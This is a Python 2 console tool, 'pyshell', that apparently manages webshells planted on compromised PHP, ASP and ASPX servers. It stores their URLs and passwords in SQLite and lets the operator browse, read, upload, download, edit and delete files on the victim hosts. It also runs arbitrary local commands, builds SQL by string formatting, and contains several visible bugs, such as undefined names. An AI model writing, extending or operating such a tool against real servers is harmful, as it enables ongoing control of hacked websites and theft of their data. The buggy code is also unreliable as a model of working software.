#! /usr/bin/env python
#! -*-coding:utf-8 -*-

import subprocess
import sys
import sqlite3
import re
from cmd import Cmd
from lib.aspxshell import *
from lib.aspshell import *
from lib.phpshell import *
from lib.tools import *

class MainConsole(Cmd):
    prompt = "pyshell> "
    Object = None
    
    def __init__(self):
        Cmd.__init__(self)
    
    #在cmdloop之前执行,打印装逼信息
    def preloop(self):
        string = '''
                                 _          _ _ 
                                | |        | | |  V1.0
                 _ __  _   _ ___| |__   ___| | |
                | '_ \| | | / __| '_ \ / _ \ | |
                | |_) | |_| \__ \ | | |  __/ | |
                | .__/ \__, |___/_| |_|\___|_|_|
                | |     __/ |                   
                |_|    |___/                    
                
                If You Want Fuck Me,Please Do It Now!
        '''
        print string
    
    #打印帮助信息
    def do_help(self, argv):
        print 'help'
    
    #增
    def do_add(self, argv):
        list = {}
        array = argv.split(' ')
        if len(array) < 3:
            print ("length Not standard")
            return 0
        if array[0].startswith("http://") or array[0].startswith("https://"):
            list['shell'] = array[0]
        else:
            self.Error("url address is not vaild!")
            return 0
        if len(array[1]) < 40:
            list['pass'] = array[1]
        else :
            self.Error("pass is too long!")
            return 0
        if array[2] in ['asp', 'aspx', 'php'] :
             list['type'] = array[2]
        else :
            self.Error("Script type error!") 
            return 0            
        list['code'] = "utf-8" if len(array) < 4 else array[3]
        sql = '''insert into shell values (NULL, "{0}", "{1}", "{2}", "{3}", {4})'''.format(list['shell'], list['pass'], list['type'], list['code'], Tools.GetUnixDate()) 
        db = DBSEStorage()
        if db.execute(sql):
            print "add ok"
        else:
            print "fuck %s " % result
        del db
        
    
    #查
    def do_show(self, argv):
        db = DBSEStorage()
        result = db.execute("select * from shell").fetchall()
        format = "id\tshell\tpass\ttype\tencode\tdate\n"
        print format
        for line in result:
            print "{0}\t{1}\t{2}\t{3}\t{4}\t{5}\t".format(line[0],line[1],line[2],line[3],line[4], Tools.timestamp_datetime(line[5]))
        del db
        
    
    #改
    def do_modify(self, argv):
        array = argv.split(' ')
        result = None
        sql= "update shell set "
        for line in array:
            # print line 
            key = line[:line.find('=')]
            value = line[line.find('=')+1:]
            if key == 'id':
                id = value
                continue
            elif key=='date':
                print "Can't modify date field"
                return False            
            sql += "%s=%s," % (key, value)
            
        sql = "{0} where id={1}".format(sql[:-1],id)        
        db = DBSEStorage()
        result = db.execute(sql)
        if result:
            print "Modify ok"
        del db

    #删
    def do_remove(self, argv):
        condition = argv.split(' ')[0]
        sql = "delete from shell where "
        if condition.find('id=')>=0 :
           ids= condition[condition.find('=')+1:]
           sql += "id in (%s)" % ids
        elif condition.find('shell=')>=0:
           shell = condition[condition.find('=')+1:]
           sql += "shell like %s" % shell
        elif re.match(r"\d+,", condition) !=None:
            sql += "id in (%s) " % condition
        elif re.match(r"%(.*?)%", condition) != None:
            sql += '''shell like "%s" ''' % condition
        else:
            print "sorry , We don't Konw what you want delete"
            return 0
            
        db = DBSEStorage()
        result = db.execute(sql)
        if result:
            print "del ok"
        else:
            print "del error"
        del db
           
    def do_search(self, argv):
        condition = argv.split(' ')
        sql = "select * from shell where "
        if condition.find('shell=')>=0:
            shell = condition[condition.find('=')+1:]
            sql += '''shell like "%s"''' % shell
        if condition.find('pass=')>=0:
            ps = condition[condition.find('=')+1:]
            sql += '''pass like "%s"''' % shell
        if condition.find('date')>=0:
            sql += '''date like "%s" ''' % condition
        else:
            print "sorry , We Don't suppost you syntax"
            return 0
        
    #执行系统命令    
    def do_shell(self, argv):
        print "[*] Exec %s" % argv
        code = subprocess.call(argv,shell=True)
 
    #指定shell，进入高级模式              
    def do_get(self, argv):
        id = argv.split(' ')[0]
        if re.match(r"\d+", id) ==None:
            print "sorry, it is just support id"
            return 0
        sql = "select * from shell where id=%s " % id
        db = DBSEStorage()
        try:
            result = db.execute(sql).fetchone()
        except:
            printf("sorry,Can't find this shell")
            return 0
        if result == None:
            printf("No this Id")
            return None
        if result[3] == "php":
            self.object = phpshell(result[1], result[2])
        elif result[3] == 'asp':
            self.object = aspshell(result[1], result[2])
        else:
            self.object = aspxshell(result[1], result[2])
        self.prompt = "pyshell|%s > " % result[3]
        del db
    
    # 高级
    # 显示文件
    def do_ls(self, argv):
        if argv.split(' ')[0] != '':
            self.object.GetFilePath(argv.split(' ')[0])
        else:
            self.object.GetFilePath()
        
    #删除文件
    def do_del(self, argv):
        filelist = argv.split(' ')[0]
        if "," in filelist:
            files = filelist.split(',')
            for line in files:
                self.object.DeleteFile(line)
            return 0
        else:
            files = filelist
            self.object.DeleteFile(files)
            return 0
        # self.object.DeleteFile( )
    
    def do_upload(self, argv):
        list = argv.split(' ')
        if "," in list[0]:
            files = filelist.split(',')
            for line in files:
                if len(list) == 2:
                    self.object.UploadFile(line, list[1])  #上传到远程文件夹
                self.object.UploadFile(line, None) # 上传到网站根目录
            return 0
        else:
            files = list[0]
            if len(list) == 2:
                self.object.UploadFile(files, list[1])  #上传到远程文件夹
            self.object.UploadFile(files, None) # 上传到网站根目录
            return 0
   
    def do_rename(self, argv):
        oldname = argv.split(' ')[0]
        newname = argv.split(' ')[1]
        self.object.RenameFile(oldname, newname)
        
    def do_read(self, argv):
        file = argv.split(' ')[0]
        self.object.ReadFile(file)
        
    def do_down(self, argv):
        file = argv.split(' ')[0]
        self.object.DownloadFile(file)
        
    def do_copy(self, argv):
        source = argv.split(' ')[0]
        desc = argv.split(' ')[1]
        self.object.CopyFile(source, desc)

    def do_edit(self, argv):
        array = argv.split(' ')
        if len(array) == 1:
            self.object.EditFile(array[0])
        
    #更新数据库
    def do_updatedb(self, argv):
        pass
        
    def do_q(self, argv):
        print "Bye"
        try:
            del self.object
        except:
            pass
        return True
    
    def do_exit(self, argv):
        print "Bye"
        del self.object
        return True
        
    def Error(self, info):
        print "asd",info
        return 0
    
class DBSEStorage:
    cursor = None
    
    def __init__(self):
        self.cursor = sqlite3.connect("pyshell.db")
        self.cursor.execute('''
        create table if not exists shell (
            id INTEGER PRIMARY KEY,
            shell varchar(100) not null,
            pass  varchar(50) not null,
            type varchar(10) not null,
            code varchar(20) default 'utf-8',
            date  int(11) not null
            )
        ''')
        self.cursor.commit()
       
    
    def execute(self, sql):
        try:
            result = self.cursor.execute(sql)
            self.cursor.commit()
            return result
        except :
            return 0
        
        
                 
    def __del__(self):
        self.cursor.close()
        


def debug(info):
    print info
    sys.exit()
  
if __name__ == '__main__':
    a = MainConsole()
    a.cmdloop()

    
    